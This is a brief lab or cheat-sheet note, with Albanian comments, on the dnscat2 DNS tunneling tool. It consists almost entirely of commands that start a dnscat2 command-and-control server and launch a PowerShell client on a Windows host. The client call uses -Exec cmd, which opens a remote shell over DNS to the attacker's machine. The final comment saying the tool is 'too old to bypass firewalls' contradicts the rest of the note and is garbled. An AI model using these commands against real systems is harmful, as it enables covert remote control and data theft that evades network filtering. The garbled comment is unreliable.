[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`).

```bash
# Klonimi i dnscat2 server në Linux
git clone <https://github.com/iagox86/dnscat2.git>

# Nisja e serverit në sistemin tënd
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# Klonimi i dnscat2-powershell në hostin Windows
git clone <https://github.com/lukebaggett/dnscat2-powershell.git>

# Injektimi i modulit dhe nisja e klientit në Powershell
Import-Module .\\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

# It is too old to bypass firewalls and other filters that block other protocols.
```
